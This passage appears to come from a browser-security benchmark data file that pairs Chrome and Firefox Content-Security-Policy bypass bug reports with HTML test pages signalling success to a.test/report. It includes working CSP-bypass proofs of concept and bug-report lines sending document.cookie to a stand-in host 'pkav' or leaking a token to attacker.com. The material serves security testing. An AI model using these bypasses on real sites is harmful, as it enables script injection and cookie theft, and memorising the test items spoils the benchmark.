id=\\\"123\\\" src=\\\"https://leak.test/CSP/c633348/helper\\\"></iframe>\\n<script>\\n  document.addEventListener(\\\"securitypolicyviolation\\\", function (e) {\\n    console.log(\\\"securitypolicyviolation_event.sourceFile=\\\" + e.sourceFile);\\n    console.log(\\\"securitypolicyviolation_event.lineNumber=\\\" + e.lineNumber);\\n    console.log(\\\"securitypolicyviolation_event.columnNumber=\\\" + e.columnNumber);\\n    if (e.sourceFile.length !== 0) {\\n      document.location.href = \\\"https://a.test/report/?leak=c633348\\\";\\n    }\\n  });\\n</script>\\n\", \"headers.json\": \"[{\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"frame-src leak.test/*; report-uri /test\\\"\\n}]\"}}, \"leak.test\": {\"helper\": {\"index.html\": \"<script>\\n    document.location.href = \\\"https://google.com/\\\";\\n</script>\"}}}}}, {\"BugReport\": \"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\\n\\nSteps to reproduce:\\n\\nOpen the following URL: data:text/html,<meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"default-src 'none'; script-src 'unsafe-eval'\\\"><marquee onstart=\\\"alert('test')\\\"></marquee>\\n\\n\\nActual results:\\n\\nJavaScript code \\\"alert('test')\\\" will be executed, while \\\"'inline-inline'\\\" not specified in CSP policy.\\n\\n\\nExpected results:\\n\\n_inline_ javascript code not executed.\", \"TestSolution\": {\"f1312272\": {\"url_queue.txt\": \"https://a.test/CSP/f1312272/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"main\": {\"index.html\": \"<img id=\\\"123\\\" />\\n\\n<marquee\\n  onstart='document.getElementById(\\\"123\\\").src = \\\"https://a.test/report/?leak=f1312272\\\"'\\n></marquee>\\n\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"default-src 'self'; script-src 'unsafe-eval'\\\"\\n  }\\n]\"}}}}}, {\"BugReport\": \"UserAgent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36\\n\\nSteps to reproduce the problem:\\n\\n1. Use sourceMapping POC:\\ndocument.write(`<script>//# sourceMappingURL=https://pkav/?${escape(document.cookie)}</script>`)\\n\\n2. Use <a ping>:\\na=document.createElement('a')\\na.href='#'\\na. ping=`//pkav/?${escape(document.cookie)}`\\na. click()\\n\\n3. Use http 204 status\\nlocation=`https://www.google.com/csi?${escape(document.cookie)}`;\\n\\nWhat is the expected behavior?\\nsend a request with data to pkav\\n\\nWhat went wrong?\\nshould be block it.\\n\\nDid this work before? N/A\\n\\nChrome version: 54.0.2840.71  Channel: stable\\nOS Version: 10.0\\nFlash Version: Shockwave Flash 23.0 r0\", \"TestSolution\": {\"c661126\": {\"a.test\": {\"main\": {\"index.html\": \"<script>\\n  a = document.createElement(\\\"a\\\");\\n  a.href = \\\"#\\\";\\n  a.ping = \\\"https://a.test/report/?leak=c661126\\\";\\n  a.click();\\n</script>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"default-src 'none'; script-src 'unsafe-inline'\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\\nBuild ID: 20161110030211\\n\\nSteps to reproduce:\\n\\n  - Enable 'strict-dynamic' if needed (\\\"security.csp.enableStrictDynamic\\\")\\n  - Open the following URL: data:text/html,<meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"default-src 'none'; script-src 'nonce-123' 'strict-dynamic'\\\"><marquee onstart=\\\"alert('test')\\\"></marquee>\\n\\n\\nActual results:\\n\\nJavaScript code \\\"alert('test')\\\" will be executed due to 'strict-dynamic\\n\\n\\n\\nExpected results:\\n\\n_inline_ javascript code not executed.\", \"TestSolution\": {\"f1316826\": {\"url_queue.txt\": \"http://leak.test/CSP/f1316826/main\\nhttps://a.test/report/?leak=baseline\\n\", \"leak.test\": {\"main\": {\"index.html\": \"<marquee\\n  onstart=\\\"document.location.href='https://a.test/report/?leak=f1316826'\\\"\\n></marquee>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"default-src 'none'; script-src 'nonce-123' 'strict-dynamic'\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\\n\\nSteps to reproduce:\\n\\nI'm using a CSP rule (provided as a header, not meta tag) on a page or iframe, where the page contains a script, as follows:\\n\\nContent-Security-Policy: sandbox allow-scripts; script-src 'none';\\n\\nI tested this in Firefox 54 and the 55 beta on Linux 64 bit.\\n\\n\\n\\n\\nActual results:\\n\\nThe script executes.\\n\\n\\nExpected results:\\n\\nThe script should not execute. If you remove the sandbox flag entirely from the CSP rule the script is blocked by the script-src 'none' rule. \\n\\nIf you swap the identical sandbox rule to the iframe (if using an iframe) as an attribute on the iframe HTML (rather than via CSP) then the script is correctly blocked. My expectation would be for the behaviour here to be the same regardless of how you specify the sandboxing.\\n\\nThe example may seem contradictory (to specify allow-scripts to only then block all scripts) but I actually noticed this when attempting to both sandbox and limit scripts to a particular domain (rather than block off all scripts) but noticed that any script was being allowed through whenever the sandbox rule was present via CSP.\\n\\nThe scope of this issue may actually be wider than only allowing through scripts. \\n\\nI've attached a zip that should hopefully illustrate the basic issue (it includes a node/npm http server wrapper for convenience).\", \"TestSolution\": {\"f1377426\": {\"url_queue.txt\": \"https://leak.test/CSP/f1377426/main\\nhttps://a.test/report/?leak=baseline\\n\", \"leak.test\": {\"main\": {\"index.html\": \"<script src=\\\"https://a.test/report/?leak=f1377426\\\"></script>\\n\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"sandbox allow-scripts; script-src 'none';\\\"\\n  }\\n]\"}}}}}, {\"BugReport\": \"UserAgent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36\\n\\nSteps to reproduce the problem:\\nPoC 1:\\n<link rel=\\\"prefetch\\\" href=\\\"http://linux.im/test_prefetch.jpg\\\">  \\n\\nPoC 2:\\n<link rel=\\\"prerender\\\" href=\\\"http://linux.im\\\">  \\n\\nPoC 3:\\n<link rel=\\\"dns-prefetch\\\" href=\\\"http://linux.im\\\">  \\n\\nPoC 4:\\n<link rel=\\\"preconnect\\\" href=\\\"http://1.111asd1-testcsp.n0tr00t.com\\\">  \\n\\nPoC 5:\\n<link rel=\\\"preload\\\" href=\\\"//linux.im/styles/other.css\\\">  \\n\\nWhat is the expected behavior?\\nRefused to load the  xxxxx\\n\\nWhat went wrong?\\nsend a request\\n\\nDid this work before? N/A\\n\\nChrome version: 54.0.2840.71  Channel: n/a\\nOS Version: 10.0\\nFlash Version: Shockwave Flash 23.0 r0\\n\\nAuthor: evi1m0\\nSource: http://paper.seebug.org/91/\", \"TestSolution\": {\"c663620\": {\"a.test\": {\"main\": {\"index.html\": \"<link rel=\\\"prefetch\\\" href=\\\"https://a.test/report/?leak=c663620-prefetch\\\" />\\n<link rel=\\\"prerender\\\" href=\\\"https://a.test/report/?leak=c663620-prerender\\\" />\\n<link\\n  rel=\\\"dns-prefetch\\\"\\n  href=\\\"https://a.test/report/?leak=c663620-dns-prefetch\\\"\\n/>\\n<link rel=\\\"preconnect\\\" href=\\\"https://a.test/report/?leak=c663620-preconnect\\\" />\\n<link rel=\\\"preload\\\" href=\\\"https://a.test/report/?leak=c663620-preload\\\" />\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"connect-src 'none'; script-src 'unsafe-inline'\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\\n\\nSteps to reproduce:\\n\\n1. Go to https://test.shhnjk.com/allow-scripts.php?xss=%3Csvg%20onload=alert(document.domain)%3E\\n2. You will see alert with document.domain\\n\\n\\nActual results:\\n\\nalert with document.domain\\n\\n\\nExpected results:\\n\\nFirefox should grant opaque origin to document when CSP sandbox doesn't have allow-same-origin flag. Currently, \\\"Content-Security-Policy: sandbox allow-scripts\\\" is enough to execute script with origin.\\n\\nhttps://www.w3.org/TR/CSP2/#directive-sandbox\\n\\\"The sandbox directive allows any resource, framed or not, to ask for the same sorts of restrictions to be applied to itself.\\\"\", \"TestSolution\": {\"f1396320\": {\"url_queue.txt\": \"https://a.test/CSP/f1396320/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"main\": {\"index.html\": \"<img id=\\\"123\\\">\\n\\n<svg onload=test()></svg>\\n\\n<script>\\n    function test() {\\n        document.getElementById(\\\"123\\\").src = \\\"https://\\\" + document.domain + \\\"/report/?leak=f1396320\\\";\\n    }\\n</script>\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"sandbox allow-scripts allow-modals;\\\"\\n  }\\n]\"}}}}}, {\"BugReport\": \"This template is ONLY for reporting security bugs. If you are reporting a\\nDownload Protection Bypass bug, please use the \\\"Security - Download\\nProtection\\\" template. For all other reports, please use a different\\ntemplate.\\nPlease READ THIS FAQ before filing a bug: https://www.chromium.org/Home\\n/chromium-security/security-faq\\nPlease see the following link for instructions on filing security bugs:\\nhttp://www.chromium.org/Home/chromium-security/reporting-security-bugs\\nNOTE: Security bugs are normally made public once a fix has been widely\\ndeployed.\\nVULNERABILITY DETAILS\\nPlease provide a brief explanation of the security issue.\\nBy loading a new document using window.open(\\\"\\\",\\\"_blank\\\") and document.write-ing into it, (being in about:blank) I can circumvent the CSP restrictions put on the document my js code was running on and reach out to other sites.\\nOne could argue that the code was loaded with unsafe-inline in the CSP header, but that should still block any cross-site communication (e.g. 1x1px tracking image etc).\\nThe about:blank page has the same origin as its loading document, but CSP restrictions have been removed.\\nI have seen there have been many issues around about:blank, but I have not found any reports just like this.\\nMy tests show that Firefox does not show this behavior, but rather makes the new document inherit CSP from its loading document.\\nHere is a POC: https://grodum.org/csptest/hey.html\\nVERSION\\nChrome Version: Version 54.0.2840.71 (64-bit) + [stable, beta, or dev]\\nOperating System: macosx 10.11.6 (15G1108)\\nREPRODUCTION CASE\\nPlease include a demonstration of the security bug, such as an attached\\nHTML or binary file that reproduces the bug when loaded in Chrome. PLEASE\\nmake the file as small as possible and remove any content not required to\\ndemonstrate the bug.\\nDemo: https://grodum.org/csptest/hey.html\\nFOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION\\nType of crash: [tab, browser, etc.]\\nCrash State: [see link above: stack trace, registers, exception record]\\nClient ID (if relevant): [see link above]\", \"TestSolution\": {\"c669086\": {\"leak.test\": {\"main\": {\"index.html\": \"<script>\\n  var w = window.open(\\\"\\\", \\\"_blank\\\");\\n  w.document.body.innerHTML =\\n    \\\"<iframe src='https://a.test/report/?leak=c669086'></iframe>\\\";\\n</script>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"default-src 'self'; script-src 'unsafe-inline'\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"Chrome Version: 55.0.2883.87 (Official Build) (64-bit)\\nOS: All\\n\\nThere is some problems when the CSPSource host-part is \\\"*\\\".\\nFor instance when the source-expression is:\\n* \\\"http://*:111\\\"  then \\\"http://a.com:222\\\" is allowed.\\n* \\\"http://*/path\\\" then \\\"http://a.com/other-path\\\" is allowed.\", \"TestSolution\": {\"c682673\": {\"a.test\": {\"main\": {\"index.html\": \"<iframe src=\\\"https://a.test/report/?leak=c682673\\\"></iframe>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"default-src https://*/random-path;\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36\\n\\nSteps to reproduce:\\n\\nLoad a page serving an SVG with an accessKey event (see attached SVG) and the CSP header script-src 'none'. \\n\\n\\nActual results:\\n\\nWhen the button is pressed, the accessKey event fires. \\n\\n\\nExpected results:\\n\\nThe accessKey event should not fire. SVG access key events are blocked by Firefox when javascript is turned off via `javascript.enabled` in about:config due to the possibility of using them as a scriptless keylogger. See https://bugzilla.mozilla.org/show_bug.cgi?id=704482 for the original bug report leading to this mitigation and a PoC keylogger. \\n\\nAs Firefox currently works, a developer could be serving a page with Javascript disabled via CSP as a security measure, and an attacker would be able to inject a scriptless keylogger into the page.\", \"TestSolution\": {\"f1422924\": {\"url_queue.txt\": \"https://a.test/CSP/f1422924/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"main\": {\"index.html\": \"<svg height=\\\"0px\\\">\\n  <image xmlns:xlink=\\\"http://www.w3.org/1999/xlink\\\" xlink:href=\\\"none\\\">\\n    <set\\n      attributeName=\\\"xlink:href\\\"\\n      begin=\\\"accessKey(a)\\\"\\n      to=\\\"https://a.test/report/?leak=f1422924\\\"\\n    />\\n  </image>\\n</svg>\\n\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"script-src 'none'\\\"\\n  }\\n]\"}}}}}, {\"BugReport\": \"UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36\\n\\nSteps to reproduce the problem:\\nPoC:\\n\\n<html>\\n<head>\\n<meta http-equiv=content-security-policy content=\\\"object-src 'none';script-src 'nonce-random-secret'\\\">\\n<title> Fake XSS </title> </head>\\n<body>\\n<base href=data:/,-alert(1)/>\\n<script src=\\\"./lib/jquery.js\\\" nonce=random-secret></script>\\n</body>\\n</html>\\n\\nOnline PoC: https://jsbin.com/vigodiqifo/1/edit?html,output\\n\\nWhat is the expected behavior?\\nWill see alert box.\\n\\nWhat went wrong?\\nBase uri changed script uri bypassed nonce prevent.\\n\\nDid this work before? N/A\\n\\nChrome version: 55.0.2883.95  Channel: n/a\\nOS Version: OS X 10.12.0\\nFlash Version: Shockwave Flash 24.0 r0\", \"TestSolution\": {\"c689412\": {\"a.test\": {\"main\": {\"index.html\": \"<html>\\n  <body>\\n    <base\\n      href=\\\"data:/,-location.replace('https://a.test/report/%3Fleak=c689412')/\\\"\\n    />\\n    <script src=\\\"./lib/jquery.js\\\" nonce=\\\"random-secret\\\"></script>\\n  </body>\\n</html>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"default-src object-src 'none'; script-src 'nonce-random-secret'\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0\\nBuild ID: 20180122220231\\n\\nSteps to reproduce:\\n\\nThe URLs located in `resource://devtools-client-jsonview/.*` bypass CSP. ( maybe intentionally )\\nA `require.js` file is in the this directory and it can be used for CSP strict-dynamic bypass against any websites.\\n\\nSteps to reproduce:\\n1. Go to attached PoC( csp_bypass_require.html ). This page has strict CSP rules:\\n\\n<meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"default-src 'none';script-src 'nonce-random' 'strict-dynamic'\\\">\\n\\n2. However, you can see `alert(1)`. It is executed from the following code:\\n\\n<script data-main='data:,alert(1)'></script>\\n<script src=\\\"resource://devtools-client-jsonview/lib/require.js\\\"></script>\\n\\n\\nActual results:\\n\\nCSP strict-dynamic is bypassed via browser resources.\\n\\n\\nExpected results:\\n\\nCSP strict-dynamic should not be bypassed via browser resources.\\nWith attachment: csp_bypass_require.html\\n<!DOCTYPE html>\\n<head>\\n<meta charset=\\\"utf-8\\\">\\n<meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"default-src 'none';script-src 'nonce-random' 'strict-dynamic'\\\">\\n</head>\\n<body>\\n\\n<!-- XSS start -->\\n<script>alert(0)//This is blocked</script>\\n<script data-main='data:,alert(1)'></script>\\n<script src=\\\"resource://devtools-client-jsonview/lib/require.js\\\"></script>\\n<!-- XSS end -->\\n\\n</body>\\n</html>\\n\\nWith attachment: csp_bypass_require_chromeurl.html\\n<!DOCTYPE html>\\n<head>\\n<meta charset=\\\"utf-8\\\">\\n<meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"default-src 'none';script-src 'nonce-random' 'strict-dynamic'\\\">\\n</head>\\n<body>\\n\\n<!-- XSS start -->\\n<script>alert(0)//This is blocked</script>\\n<script data-main='data:,alert(1)'></script>\\n<script src=\\\"chrome://browser/content//chrome/devtools/modules/devtools/client/jsonview/lib/require.js\\\"></script>\\n<!-- XSS end -->\\n\\n</body>\\n</html>\\n\", \"TestSolution\": {\"f1432358\": {\"url_queue.txt\": \"http://a.test/CSP/f1432358/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"main\": {\"index.html\": \"<!DOCTYPE html>\\n<head>\\n<meta charset=\\\"utf-8\\\">\\n<meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"default-src 'none';script-src 'nonce-random' 'strict-dynamic'\\\">\\n</head>\\n<body>\\n\\n<!-- XSS start -->\\n<script data-main='data:,document.location.href=\\\"https://a.test/report/?leak=f1432358\\\"'></script>\\n<script src=\\\"resource://devtools-client-jsonview/lib/require.js\\\"></script>\\n<!-- XSS end -->\\n\\n</body>\\n</html>\\n\"}}}}}, {\"BugReport\": \"VULNERABILITY DETAILS\\nIt seems like the specification of how App Cache is working is a lot less restrictive compared to Service Workers.\\nThe following scenarios are possible using an App-Cache manifest:\\n* manifest can be set even though page has Content-Security-Policy: sandbox\\n* manifest can be set on origin, even being on a suborigin\\n* manifest FALLBACK can fetch resources not allowed by CSP\\n* an SVG-file can set a manifest (even if mime is image/svg+xml)\\n* an XML can set manifest (using xmlns=xhtml)\\n* a file below a path (u/XYZ) can set FALLBACK for the complete origin\\nThis currently affects a bunch of file serving services which uses sandboxed origins but still serve inline content on the sandboxed domains. By triggering a cookie-bomb combined with a manifest, you're able to hijack any URL on the sandboxed domain using FALLBACK independently if the files are served from a sub-path on the domain.\\nThere are no CSP-rules to prevent the App Cache manifest from getting installed and the only mitigation as far as I know today is to block any inline content.\\nManifest should not be possible to set from a page having Content-Security-Policy: sandbox\\nManifest should (probably) not be possible to set from a subfolder onto the complete origin (this will probably break a bunch of apps tho)\\nSetting a manifest should probably be restricted to text/html only.\\nVERSION\\n56.0.2924.87 (Official Build) (64-bit)\\nREPRODUCTION CASE\\nAttached a file with CSP: sandbox that will still trigger the Manifest-installation.\\nAlso attached a manifest.txt-file that will set the FALLBACK to a specific URL, this manifest can be set from any path on the origin and will set the FALLBACK for the complete domain.\\nWith attachment: test.php\\n<?\\nheader(\\\"Content-Security-Policy: sandbox;\\\");\\n?>\\n<html manifest=\\\"manifest.txt\\\"></html>\\n\\nWith attachment: manifest.txt\\nCACHE MANIFEST\\n\\nFALLBACK:\\n/ /s3/xss.html\\n\\nNETWORK:\\nhttp://*\\nhttps://*\\n*\\n\", \"TestSolution\": {\"c696806\": {\"a.test\": {\"main\": {\"index.html\": \"<html manifest=\\\"/report/?leak=c696806\\\"></html>\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"sandbox\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36\\n\\nSteps to reproduce:\\n\\nvisit this POC.html:\\n===\\n<html>\\n<meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"default-src 'self';script-src 'none';object-src data:;img-src 'none';frame-src data:\\\"/>\\n<!-- CSP is set and both script-src and img-src is 'none' -->\\n<body>\\n\\n<!-- inline script will run and remote image load -->\\n<object data='data:text/html;,<svg version=\\\"1.1\\\" width=\\\"660\\\" height=\\\"342\\\" xmlns=\\\"http://www.w3.org/2000/svg\\\" xmlns:xlink=\\\"http://www.w3.org/1999/xlink\\\"><script>console.log(\\\"Remote Image test\\\")</script><image xlink:href=\\\"https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/img/logo/bd_logo1_31bdc765.png?x\\\" width=\\\"660\\\" height=\\\"342\\\"/></svg>'></object>\\n\\n\\n<!-- CSP works fine -->\\n<iframe src='data:text/html;,<script>console.log(\\\"Remote Image test\\\")</script><img src=\\\"https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/img/logo/bd_logo1_31bdc765.png?x\\\" width=\\\"660\\\" height=\\\"342\\\"/>'></iframe>\\n</body>\\n</html>\\n===\\n\\n\\nActual results:\\n\\nin object tag , inline script runs and remote image loads , but in iframe tag ,CSP works fine\\n\\n\\nExpected results:\\n\\nRef: https://www.w3.org/TR/CSP3/#directive-img-src\\n\\\"This directive controls requests which load images. More formally, this includes requests whose type is \\\"image\\\" [FETCH].\\\"\\n\\nRef: https://www.w3.org/TR/CSP3/#directive-script-src\\n\\\"The script-src directive restricts the locations from which scripts may be executed. This includes not only URLs loaded directly into script elements, but also things like inline script blocks and XSLT stylesheets [XSLT] which can trigger script execution.\\\"\\n\\nobject tag should behaves like iframe\", \"TestSolution\": {\"f1441468\": {\"url_queue.txt\": \"https://leak.test/CSP/f1441468/main\\nhttps://a.test/report/?leak=baseline\\n\", \"leak.test\": {\"main\": {\"index.html\": \"<html>\\n  <body>\\n    <!-- inline script will run and remote image load -->\\n    <object\\n      data='data:text/html;,<svg version=\\\"1.1\\\" width=\\\"660\\\" height=\\\"342\\\" xmlns=\\\"http://www.w3.org/2000/svg\\\" xmlns:xlink=\\\"http://www.w3.org/1999/xlink\\\"><script>console.log(\\\"Remote Image test\\\")</script><image xlink:href=\\\"https://a.test/report/?leak=f1441468\\\" width=\\\"660\\\" height=\\\"342\\\"/></svg>'\\n    ></object>\\n  </body>\\n</html>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"default-src 'self';script-src 'none';object-src data:;img-src 'none';frame-src data:\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36\\n\\nSteps to reproduce the problem:\\n1. Go to https://test.shhnjk.com/embenf.html\\n2. Violation report including secret token is leaked to attacker's URL\\n\\nWhat is the expected behavior?\\nMaybe disallow report-uri or script-sample in iframe's csp attribute?\\n\\nWhat went wrong?\\nScenario:\\nhttps://vuln.shhnjk.com trusts https://test.shhnjk.com. So https://vuln.shhnjk.com/allowcsp.php has \\\"Allow-CSP-From: https://test.shhnjk.com\\\" header set.\\n\\nNow attacker found HTML injection in https://test.shhnjk.com. So he/she injected iframe with csp attribute \\\"script-src 'sha256-test' 'report-sample'; report-uri https://attacker.com\\\".\\n\\nBecause attacker injected 'report-sample' and 'report-uri', attacker gets secret token in the script of https://vuln.shhnjk.com/allowcsp.php.\\n\\nDid this work before? N/A\\n\\nChrome version: 61.0.3128.0  Channel: canary\\nOS Version: OS X 10.12.5\\nFlash Version:\\n\\nLet me know if this is acceptable risk in Embedded Enforcement. Then I'll blog about it.\", \"TestSolution\": {\"c732779\": {\"url_queue.txt\": \"https://leak.test/CSP/c732779/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"helper\": {\"index.html\": \"<script nonce=\\\"2726c7f26c\\\">\\n  var token=\\\"This is Secret!!\\\";\\n  document.write(\\\"Loaded\\\");\\n</script>\", \"headers.json\": \"[{\\n  \\\"key\\\": \\\"Content-Security-Policy\\\",\\n  \\\"value\\\": \\\"script-src 'nonce-2726c7f26c'\\\"\\n}, {\\n  \\\"key\\\": \\\"allow-csp-from\\\",\\n  \\\"value\\\": \\\"https://leak.test\\\"\\n}]\"}}, \"leak.test\": {\"main\": {\"index.html\": \"<iframe\\n  src=\\\"https://a.test/CSP/c732779/helper\\\"\\n  csp=\\\"script-src 'sha256-test' 'report-sample'; report-uri https://a.test/report/?leak=c732779\\\"\\n></iframe>\\n\"}}}}}, {\"BugReport\": \"Step to reproduce:\\n\\n1. Navigate the following data URL (or create a HTML document with the same content and navigate it):\\ndata:text/html,<meta http-equiv=\\\"Content-security-policy\\\" content=\\\"script-src none;\\\"/><script>alert(location)</script><object data=\\\"data:text/html,object<script>alert('object')</script>\\\"></object><iframe src=\\\"data:text/html,iframe<script>alert('frame')</script>\\\"></iframe>\\n\\nExpected result: no JavaScript gets executed (no alert is shown)\\nActual result: one alert saying \\\"object\\\" is shown\\n\\nThis demonstrates that the iframe's document inherits parent's CSP, but the object's document doesn't. According to https://www.w3.org/TR/CSP2/#which-policy-applies they should behave the same way, i.e. being governed by \\\"the policy of the embedding resource\\\".\\n\\nThis can be also used to bypass WebExtensions relying on CSP to block scripts: even though the embedded document has null origin, it could deliver a self-contained exploit.\", \"TestSolution\": {\"f1457100\": {\"url_queue.txt\": \"https://a.test/CSP/f1457100/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"main\": {\"index.html\": \"<object\\n  data=\\\"data:text/html,object<script>document.location.href='https://a.test/report/?leak=f1457100'</script>\\\"\\n></object>\\n<iframe src=\\\"data:text/html,iframe<script>alert('frame')</script>\\\"></iframe>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"script-src none;\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36\\n\\nSteps to reproduce the problem:\\nAs stated in https://github.com/w3c/webappsec-csp/issues/98 ; Chromium contains a protection against nonce stealing prevention, with detecting \\\"<script\\\" or \\\"<style\\\" in attribute name or value.\\n\\nThe prevention could be bypassed by duplicate attribute's name, for example:\\n\\n<!-- the following will not execute -->\\n<meta http-equiv=Content-Security-Policy\\n      content=\\\"script-src 'nonce-abcd'\\\">\\n<script src=data:,alert(1) nonce=\\\"abcd\\\" >\\n</script>\\n\\n<!-- the following will execute -->\\n<meta http-equiv=Content-Security-Policy\\n      content=\\\"script-src 'nonce-abcd'\\\">\\n<script src=data:,alert(1) x=\\\"\\\" x=\\\"<script\\\" nonce=\\\"abcd\\\" >\\n</script>\\n\\nPlease note that the issue has already been discussed in public:\\n- https://twitter.com/SecurityMB/status/883641714296193024\\n- https://jsbin.com/kayesofuto/edit?html,output\\n\\nWhat is the expected behavior?\\n\\nWhat went wrong?\\nThe prevention should detect \\\"<script\\\" string even if it is within a duplicated attribute.\\n\\nDid this work before? N/A\\n\\nChrome version: 59.0.3071.115  Channel: stable\\nOS Version: OS X 10.12.5\\nFlash Version:\", \"TestSolution\": {\"c740615\": {\"url_queue.txt\": \"https://leak.test/CSP/c740615/main\\nhttps://a.test/report/?leak=baseline\\n\", \"leak.test\": {\"main\": {\"index.html\": \"<head>\\n  <meta\\n    http-equiv=\\\"Content-Security-Policy\\\"\\n    content=\\\"script-src 'nonce-abcd'\\\"\\n  />\\n</head>\\n<body>\\n  <img id=\\\"123\\\" />\\n  <script\\n    src=\\\"data:,document.getElementById('123').src='https://a.test/report/?leak=c740615'\\\"\\n    x=\\\"\\\"\\n    x=\\\"<script\\\"\\n    nonce=\\\"abcd\\\"\\n  ></script>\\n</body>\\n\"}}}}}, {\"BugReport\": \"UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36\\n\\nSteps to reproduce the problem:\\n1. Go to https://test.shhnjk.com/simple.html\\n2. data URL navigated by cross-origin inherited parent's CSP\\n\\nWhat is the expected behavior?\\nCSP does not inherit to cross-origin navigated data URL.\\n\\nWhat went wrong?\\nChrome always inherits CSP to data URL, whether it was navigated by same-origin page or cross-origin page. Thus allowing cross-origin page to gain information of CSP by navigating data URL which contains check of various CSP directives (PoC checks img-src and style-src).\\n\\nPoC shows that image request was block by parent's CSP but stylesheet was allowed. This data can be used to determine parent's website (by CSP fingerprint) and/or weakness of parent's CSP.\\n\\nDid this work before? N/A\\n\\nChrome version: 61.0.3163.79  Channel: n/a\\nOS Version: OS X 10.12.6\\nFlash Version:\\n\\nWhy Chrome started blocking server side redirect to data URL even inside iframe (see second iframe)?\", \"TestSolution\": {\"c767635\": {\"url_queue.txt\": \"https://leak.test/CSP/c767635/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"helper\": {\"index.html\": \"<script>\\n  location.replace(\\n    